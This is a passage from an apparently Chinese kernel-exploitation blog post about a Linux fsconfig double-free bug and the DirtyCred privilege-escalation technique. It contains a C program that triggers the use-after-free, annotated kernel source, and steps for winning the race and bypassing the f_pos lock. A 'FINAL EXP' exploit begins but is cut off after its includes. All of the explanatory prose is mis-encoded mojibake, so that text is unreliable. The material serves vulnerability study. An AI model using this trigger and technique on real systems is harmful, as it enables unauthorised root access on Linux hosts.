class="hljs-built_in">free</span>(fc);<br><br>security_free_mnt_opts(&amp;fc-&gt;security);<br>put_net(fc-&gt;net_ns);<br>put_user_ns(fc-&gt;user_ns);<br>put_cred(fc-&gt;cred);<br>put_fc_log(fc);<br>put_filesystem(fc-&gt;fs_type);<br>kfree(fc-&gt;source);<br>kfree(fc);<br>&#125;<br></code></pre></td></tr></table></figure><p>è‹¥ä¹‹å‰å°†<code>fc-&gt;source</code>æŒ‡å‘ä¸€ä¸ªæ–‡ä»¶å®ä¾‹ï¼Œé‚£ä¹ˆåœ¨æ­¤å¤„é‡Šæ”¾åï¼Œè¯¥å®ä¾‹äº‹å®ä¸Šè¿˜åœ¨ä½¿ç”¨ä¸­</p><p>å¯ä»¥å…³é—­ä¸ä¹‹å…³è”çš„æ–‡ä»¶æè¿°ç¬¦é€ æˆ<code>double free</code></p><p>å¯ä»¥å†™ä¸ªå°demoæµ‹è¯•ä¸€ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/mount.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/unistd.h&gt;</span></span><br><br><span class="hljs-type">int</span> tmp;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">err_exit</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);<br>    sleep(<span class="hljs-number">5</span>);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> fscontext_fd;<br>    fscontext_fd = syscall(__NR_fsopen, <span class="hljs-string">&quot;cgroup&quot;</span>, FSOPEN_CLOEXEC);<br>    <span class="hljs-keyword">if</span> (fscontext_fd &lt; <span class="hljs-number">0</span>)<br>        err_exit(<span class="hljs-string">&quot;fsopen failed!&quot;</span>);<br><br>    <span class="hljs-type">int</span> fd_null = open(<span class="hljs-string">&quot;/dev/null&quot;</span>, O_RDONLY);<br>    <span class="hljs-keyword">if</span> (fd_null &lt; <span class="hljs-number">0</span>)<br>        err_exit(<span class="hljs-string">&quot;open /dev/null failed!&quot;</span>);<br><br>    syscall(__NR_fsconfig, fscontext_fd, FSCONFIG_SET_FD, <span class="hljs-string">&quot;source&quot;</span>, <span class="hljs-literal">NULL</span>, fd_null);<br>    close(fscontext_fd);<br><br>    tmp = open(<span class="hljs-string">&quot;/dev/ptmx&quot;</span>, O_RDONLY);<br><br><br>&#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°åœ¨<code>put_fs_context</code>ä¸­æ˜¯é‡Šæ”¾çš„æ˜¯<code>0xffff888005f59c00</code>çš„å †å—</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/f04ac0e24d6468fdac631d981d05e09.png"></p><p>åœ¨æ¥ä¸‹æ‰“å¼€&#x2F;<code>dev/ptmx</code>è¿‡ç¨‹ä¸­ï¼Œå‘ç°é‡æ–°ç”³è¯·å›æ¥çš„fileç»“æ„ä½“å’Œä¹‹å‰çš„é‡Šæ”¾çš„å †å—ç›¸åŒ</p><p>ä½†æ˜¯æ­¤æ—¶<code>fd_null</code>å¹¶æœªå…³é—­ï¼Œäºæ˜¯ï¼Œæ­¤æ—¶æ˜¯<code>/dev/null</code>å’Œ&#x2F;<code>dev/ptmx</code>å…±ç”¨ä¸€ä¸ªfile</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/b05d5310f1ef2e669c3cfa814e69ce4.png"></p><h1 id="0x04ï¼šæ¼æ´åˆ©ç”¨â€”â€”dirtycredï¼ï¼ï¼"><a href="#0x04ï¼šæ¼æ´åˆ©ç”¨â€”â€”dirtycredï¼ï¼ï¼" class="headerlink" title="0x04ï¼šæ¼æ´åˆ©ç”¨â€”â€”dirtycredï¼ï¼ï¼"></a>0x04ï¼šæ¼æ´åˆ©ç”¨â€”â€”dirtycredï¼ï¼ï¼</h1><p>äºæ­¤å¤„å®è·µä¸€ä¸‹<strong>dirtycred</strong>è¿™ä¸€æ‰‹æ³•</p><p>æ ¹æ®æ¼æ´ï¼Œå¯ä»¥é€ æˆä¸€ä¸ª<code>file</code>å‡­è¯çš„<code>UAF</code>ï¼Œæ­¥éª¤å¦‚ä¸‹ï¼š</p><ol><li>å½“åœ¨ç”¨æˆ·æ€æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶æ—¶ï¼Œå†…æ ¸ä¼šåˆ†é…ä¸€ä¸ª<code>file</code>ç»“æ„ä½“ï¼Œç”¨æ¥ä¿å­˜æ–‡ä»¶çš„ä¿¡æ¯</li><li>åˆ©ç”¨<code>fsopen</code>æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿï¼Œä½¿ç”¨<code>fsconfig</code>å¯ä»¥æŒ‡å®šå·²ç»æ‰“å¼€çš„æ–‡ä»¶å’Œæ–‡ä»¶ç³»ç»Ÿ</li><li><code>fsconfig</code>ä¸­å­˜åœ¨å‚æ•°è§£ææ¼æ´ï¼Œå€’æ˜¯å…³é—­æ–‡ä»¶ç³»ç»Ÿæ—¶ï¼Œä¼šé€ æˆ<code>file</code>ç»“æ„ä½“çš„é‡Šæ”¾ï¼Œå½¢æˆ<strong>UAF</strong>æ¼æ´</li><li>æ¥ä¸‹æ¥ä¸æ–­å¾—æ‰“å¼€æ–‡ä»¶ï¼Œå¯ä»¥åˆ†é…åˆ°è¢«é‡Šæ”¾å¾—<code>file</code>ç»“æ„ï¼Œæ­¤æ—¶ï¼Œå­˜åœ¨ä¸¤ä¸ªæ–‡ä»¶æè¿°ç¬¦æŒ‡å‘åŒä¸€ä¸ª<code>file</code>ç»“æ„ä½“</li></ol><p>ä¸‹å›¾æ¥è‡ªblingblingå¸ˆå‚…çš„blogå‘œå‘œ</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240405163727.png"></p><p>æ ¹æ®<strong>dirtycred</strong>çš„æ€è·¯ï¼Œåœ¨æ–‡ä»¶æ£€æŸ¥å’Œå®é™…å†™å…¥é—´éš™ï¼Œå°†<code>file</code>ç»“æ„ä½“æ›¿æ¢æˆæ— å†™å…¥æƒé™çš„ç‰¹æƒæ–‡ä»¶</p><p>ä¸€èˆ¬æ¥è¯´ï¼Œ<code>write</code>çš„å‡½æ•°è°ƒç”¨é“¾ä¸º</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs SCSS"><span class="hljs-built_in">sys_write</span>()<br><span class="hljs-built_in">ksys_write</span>()<br><span class="hljs-built_in">vfs_write</span>()<br>new_sync_write <br>call_write_iter <br>file-&gt;f_op-&gt;write_iter<br></code></pre></td></tr></table></figure><p><strong>vfs_write</strong></p><p>åœ¨<code>vfs_write</code>ä¸­ï¼Œä¼šcheckå°†è¦å†™å…¥çš„æ–‡ä»¶æ˜¯å¦å…·æœ‰å¯å†™å…¥æƒé™</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">vfs_write</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file, <span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *buf, <span class="hljs-type">size_t</span> count, <span class="hljs-type">loff_t</span> *pos)</span><br>&#123;<br><span class="hljs-type">ssize_t</span> ret;<br><br><span class="hljs-keyword">if</span> (!(file-&gt;f_mode &amp; FMODE_WRITE))<span class="hljs-comment">//check</span><br><span class="hljs-keyword">return</span> -EBADF;<br><span class="hljs-keyword">if</span> (!(file-&gt;f_mode &amp; FMODE_CAN_WRITE))<span class="hljs-comment">//check</span><br><span class="hljs-keyword">return</span> -EINVAL;<br><span class="hljs-keyword">if</span> (unlikely(!access_ok(buf, count)))<br><span class="hljs-keyword">return</span> -EFAULT;<br><br>ret = rw_verify_area(WRITE, file, pos, count);<br><span class="hljs-keyword">if</span> (ret)<br><span class="hljs-keyword">return</span> ret;<br><span class="hljs-keyword">if</span> (count &gt; MAX_RW_COUNT)<br>count =  MAX_RW_COUNT;<br>file_start_write(file);<br><span class="hljs-keyword">if</span> (file-&gt;f_op-&gt;write)<br>ret = file-&gt;f_op-&gt;write(file, buf, count, pos);<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (file-&gt;f_op-&gt;write_iter)<br>ret = new_sync_write(file, buf, count, pos);<br><span class="hljs-keyword">else</span><br>ret = -EINVAL;<br><span class="hljs-keyword">if</span> (ret &gt; <span class="hljs-number">0</span>) &#123;<br>fsnotify_modify(file);<br>add_wchar(current, ret);<br>&#125;<br>inc_syscw(current);<br>file_end_write(file);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨ä¸åŒçš„æ–‡ä»¶ç³»ç»Ÿä¸­ï¼Œ<code>file-&gt;f_op-&gt;write_iter</code>ä¸åŒï¼Œå¸¸è§ä¸­çš„<strong>ext4</strong>ç³»ç»Ÿä¸­å¯¹åº”çš„æ˜¯<code>ext4_buffered_write_iter</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span> <span class="hljs-title function_">ext4_buffered_write_iter</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kiocb *iocb,</span><br><span class="hljs-params"><span class="hljs-keyword">struct</span> iov_iter *from)</span><br>&#123;<br><span class="hljs-type">ssize_t</span> ret;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode</span> *<span class="hljs-title">inode</span> =</span> file_inode(iocb-&gt;ki_filp);<br><br><span class="hljs-keyword">if</span> (iocb-&gt;ki_flags &amp; IOCB_NOWAIT)<br><span class="hljs-keyword">return</span> -EOPNOTSUPP;<br><br>inode_lock(inode);<span class="hljs-comment">//æ­¤å¤„ä¾¿ä¼šå¯¹å†™å…¥çš„è¿›ç¨‹åŠ é”ï¼ŒåŒä¸€æ—¶é—´å†…åªå…è®¸ä¸€ä¸ªè¿›ç¨‹è¿›è¡Œå†™å…¥æ“ä½œ</span><br>ret = ext4_write_checks(iocb, from);<br><span class="hljs-keyword">if</span> (ret &lt;= <span class="hljs-number">0</span>)<br><span class="hljs-keyword">goto</span> out;<br><br>ret = generic_perform_write(iocb, from);<br><br>out:<br>inode_unlock(inode);<br><span class="hljs-keyword">if</span> (unlikely(ret &lt;= <span class="hljs-number">0</span>))<br><span class="hljs-keyword">return</span> ret;<br><span class="hljs-keyword">return</span> generic_write_sync(iocb, ret);<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸‹å›¾ä¹Ÿæ˜¯æ¥è‡ªblingblingå¸ˆå‚…çš„blog</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240406133530.png"></p><p>ä½†æ˜¯ï¼Œè¿™ä¸ªæ—¶é—´çª—å£éå¸¸å°ã€‚ä¸”ä¸€èˆ¬å¸¸ç”¨çš„<strong>userfaultfd</strong>åœ¨<strong>5.11</strong>ç‰ˆæœ¬åŠä»¥åï¼Œæ— æ³•åœ¨<strong>éroot</strong>æƒé™ä¸‹ä½¿ç”¨ï¼Œè€Œä»£æ›¿userfaultfdçš„<strong>FUSE</strong>ç¬”è€…è¿˜8ä¼šã€‚ä¾¿é‡‡ç”¨äº†å‘æ–‡ä»¶å†™å…¥å¤§é‡dataè¿™ä¸€æ–¹æ³•â€”â€”å› ä¸ºæ–‡ä»¶ç³»ç»Ÿä¸å…è®¸ä¸¤ä¸ªè¿›ç¨‹åŒæ—¶å†™åŒä¸€ä¸ªæ–‡ä»¶ï¼Œå‡è®¾è¿›ç¨‹A&#x2F;BåŒæ—¶å¯¹åŒä¸€æ–‡ä»¶å†™å…¥ï¼Œè¿›ç¨‹Aå…ˆè·å–é”ï¼Œå†™å…¥å¤§é‡æ•°æ®ï¼ˆ1Gæ–‡ä»¶å¤§æ¦‚è¦å†™2-3ç§’ï¼Œå¯ä»¥è¯´æ˜¯å¾ˆé•¿çš„æ—¶é—´çª—å£äº†ï¼‰ï¼Œè¿›ç¨‹Båœ¨å®Œæˆcheckåç­‰å¾…è·å–é”ï¼Œé‚£ä¹ˆè¿™ä¸­é—´çš„æ—¶é—´å°±å¯ä»¥æ›¿æ¢<code>file</code>ç»“æ„ä½“</p><p>ä¸‹å›¾è¿˜æ˜¯æ¥è‡ªblingblingå¸ˆå‚…çš„blog</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240406133603.png"></p><p><strong>PS1ï¼šfsopenå’Œfsconfigåªç”¨åœ¨rootæƒé™ä¸‹æ‰å¯ä½¿ç”¨ï¼Œæ‰€ä»¥éœ€è¦å¼€è¾Ÿæ–°çš„å‘½åç©ºé—´æ¥ç»•è¿‡è¯¥é™åˆ¶</strong></p><p><strong>PS2ï¼šå¯¹å°†è¦æ‰“å¼€çš„æ™®é€šæƒé™æ–‡ä»¶åˆ›å»ºä¸€ä¸ªé“¾æ¥</strong></p><p>åœ¨<code>ksys_write</code>ä¸­ï¼Œä¼šè°ƒç”¨åˆ°<code>fdget_pos</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">ksys_write</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> fd, <span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *buf, <span class="hljs-type">size_t</span> count)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fd</span> <span class="hljs-title">f</span> =</span> fdget_pos(fd);<br><span class="hljs-type">ssize_t</span> ret = -EBADF;<br>.......<br></code></pre></td></tr></table></figure><p><code>fdget_pos</code>æ˜¯<code>__fdget_pos</code>çš„å¥—å¨ƒ</p><p>å¦‚æœ<code>file_needs_f_pos_lock(file)</code>è¿”å›å€¼ä¸º<code>true</code>ï¼Œé‚£ä¹ˆè¿™ä¸ªçº¿ç¨‹å°±ä¼šè¢«ä¸Šé”ï¼Œä½†æ˜¯æ­¤æ—¶è¿˜æ²¡è¿‡<code>file</code>æƒé™checkå‘¢ï¼Œè¿™æ˜¾ç„¶æ˜¯æˆ‘ä»¬ä¸æƒ³çœ‹åˆ°çš„ï¼Œé‚£è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> __fdget_pos(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> fd)<br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> v = __fdget(fd);<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">file</span> =</span> (<span class="hljs-keyword">struct</span> file *)(v &amp; ~<span class="hljs-number">3</span>);<br><br><span class="hljs-keyword">if</span> (file &amp;&amp; file_needs_f_pos_lock(file)) &#123;<br>v |= FDPUT_POS_UNLOCK;<br>mutex_lock(&amp;file-&gt;f_pos_lock);<br>&#125;<br><span class="hljs-keyword">return</span> v;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°å¦‚æœ<code>file-&gt;f_mode</code>å¸¦æœ‰ <strong>FMODE_ATOMIC_POS</strong>è¿™ä¸ªæ ‡å¿—ï¼Œé‚£è¿™ä¸ªè¿”å›å€¼ä¸º1</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Try to avoid f_pos locking. We only need it if the</span><br><span class="hljs-comment"> * file is marked for FMODE_ATOMIC_POS, and it can be</span><br><span class="hljs-comment"> * accessed multiple ways.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Always do it for directories, because pidfd_getfd()</span><br><span class="hljs-comment"> * can make a file accessible even if it otherwise would</span><br><span class="hljs-comment"> * not be, and for directories this is a correctness</span><br><span class="hljs-comment"> * issue, not a &quot;POSIX requirement&quot;.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">bool</span> <span class="hljs-title function_">file_needs_f_pos_lock</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file)</span><br>&#123;<br><span class="hljs-keyword">return</span> (file-&gt;f_mode &amp; FMODE_ATOMIC_POS) &amp;&amp;<br>(file_count(file) &gt; <span class="hljs-number">1</span> || file-&gt;f_op-&gt;iterate_shared);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>what is FMODE_ATOMIC_POS?</strong></p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240405214853.png" style="zoom:50%;" /><p>æºç æœç´¢å‘ç°<code>open</code>ä¸­ä¹Ÿè°ƒç”¨åˆ°äº†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">......<br><span class="hljs-comment">/* POSIX.1-2008/SUSv4 Section XSI 2.9.7 */</span><br><span class="hljs-keyword">if</span> (S_ISREG(inode-&gt;i_mode) || S_ISDIR(inode-&gt;i_mode))<br>f-&gt;f_mode |= FMODE_ATOMIC_POS;<br>......<br></code></pre></td></tr></table></figure><p>é‚£<strong>S_ISREG</strong>å’Œ<strong>S_ISDIR</strong>åˆä¸ºä½•ç‰©ï¼Ÿ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> S_ISLNK(m)(((m) &amp; S_IFMT) == S_IFLNK)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> S_ISREG(m)(((m) &amp; S_IFMT) == S_IFREG)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> S_ISDIR(m)(((m) &amp; S_IFMT) == S_IFDIR)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> S_ISCHR(m)(((m) &amp; S_IFMT) == S_IFCHR)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> S_ISBLK(m)(((m) &amp; S_IFMT) == S_IFBLK)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> S_ISFIFO(m)(((m) &amp; S_IFMT) == S_IFIFO)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> S_ISSOCK(m)(((m) &amp; S_IFMT) == S_IFSOCK)</span><br><span class="hljs-comment">//S_ISLNK(st_mode)ï¼šæ˜¯å¦æ˜¯ä¸€ä¸ªè¿æ¥</span><br><span class="hljs-comment">//S_ISREG(st_mode)ï¼šæ˜¯å¦æ˜¯ä¸€ä¸ªå¸¸è§„æ–‡ä»¶</span><br><span class="hljs-comment">//S_ISDIR(st_mode)ï¼šæ˜¯å¦æ˜¯ä¸€ä¸ªç›®å½•</span><br><span class="hljs-comment">//S_ISCHR(st_mode)ï¼šæ˜¯å¦æ˜¯ä¸€ä¸ªå­—ç¬¦è®¾å¤‡</span><br><span class="hljs-comment">//S_ISBLK(st_mode)ï¼šæ˜¯å¦æ˜¯ä¸€ä¸ªå—è®¾å¤‡</span><br><span class="hljs-comment">//S_ISFIFO(st_mode)ï¼šæ˜¯å¦ æ˜¯ä¸€ä¸ªFIFOæ–‡ä»¶.</span><br><span class="hljs-comment">//S_ISSOCK(st_mode)ï¼šæ˜¯å¦æ˜¯ä¸€ä¸ªSOCKETæ–‡ä»¶</span><br></code></pre></td></tr></table></figure><p>æ‰€ä»¥åªè¦æˆ‘ä»¬æ‰“å¼€çš„æ–‡ä»¶ä¸æ˜¯ç›®å½•æˆ–è€…å¸¸è§„æ–‡ä»¶å°±å¯ä»¥è§„é¿æ‰è¿™ä¸ªé”</p><h2 id="FINAL-EXP"><a href="#FINAL-EXP" class="headerlink" title="FINAL EXP"></a>FINAL EXP</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stddef.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/utsname.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/mount.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/unistd.h&gt;</span></span><br><span class="hljs-meta">#<span 